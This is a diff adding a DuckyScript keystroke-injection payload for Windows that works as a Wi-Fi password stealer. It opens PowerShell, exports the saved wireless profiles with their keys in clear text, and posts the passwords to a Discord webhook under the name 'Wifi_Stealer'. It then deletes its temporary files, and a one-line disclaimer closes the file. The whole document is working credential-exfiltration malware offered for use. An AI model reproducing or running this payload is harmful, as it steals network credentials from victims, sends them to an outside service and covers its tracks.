@@ -1,0 +1,31 @@
+REM Title: Wifi to discord 
+REM Hosted : https://github.com/Julessssz
+REM Target:  Windows 10/11 
+REM Supported Layout keyboard: US/FR
+REM Version: 1.0
+REM Category: Grabber
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+DELAY 2000
+REM setting variable
+STRING $desktop = ([Environment]::GetFolderPath("Desktop"))
+ENTER
+STRING New-Item -Path $env:temp -Name "js2k3kd4nne5dhsk" -ItemType "directory"; Set-Location -Path "$env:temp/js2k3kd4nne5dhsk"; netsh wlan export profile key=clear; Select-String -Path *.xml -Pattern 'keyMaterial' | % { $_ -replace '</?keyMaterial>', ''} | % {$_ -replace "C:\\Users\\$env:UserName\\Desktop\\", ''} | % {$_ -replace '.xml:22:', ''} > $desktop\0.txt
+ENTER
+REM (replace <your-key by ur discord url)
+STRING $webhookUri = $desktop = ([Environment]::GetFolderPath("Desktop"));$webhookUri = 'https://discord.com/api/webhooks/<your-key>'; $filePath = "$desktop\0.txt"; $fileContent = Get-Content -Path $filePath | Out-String
+ENTER 
+STRING $Body = @{
+SHIFT ENTER 
+STRING 'username' = 'Wifi_Stealer'
+SHIFT ENTER
+STRING   'content' = $fileContent
+SHIFT ENTER
+STRING }
+SHIFT ENTER 
+ENTER
+STRING Invoke-RestMethod -Uri $webhookUri -Method 'post' -Body $Body;Set-Location -Path "$env:temp"; Remove-Item -Path "$env:tmp/js2k3kd4nne5dhsk" -Force -Recurse;rm $desktop\0.txt; exit
+ENTER
+REM Not responsible if used for purposes other than education.
